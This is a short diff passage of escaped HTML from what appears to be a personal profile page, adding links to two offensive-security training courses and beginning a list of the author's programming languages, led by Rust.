+&lt;li&gt;&lt;a href=&#34;https://www.offsec.com/courses/exp-301/&#34;&gt;Offensive Security Exploit Developer (OSED/EXP-301)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://institute.sektor7.net/red-team-operator-malware-development-essentials&#34;&gt;Red team operator Malware development (Sektor7)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;h1 id=&#34;languages-ranked-based-on-my-proficiency-from-highest-to-lowest-according-to-my-reading-and-writing-abilities&#34;&gt;Languages ranked based on my proficiency from highest to lowest, according to my reading and writing abilities.&lt;/h1&gt;
 &lt;ul&gt;
 &lt;li&gt;Rust (safe code and unsafe code (ex. windows API, NT calls or libc))&lt;/li&gt;
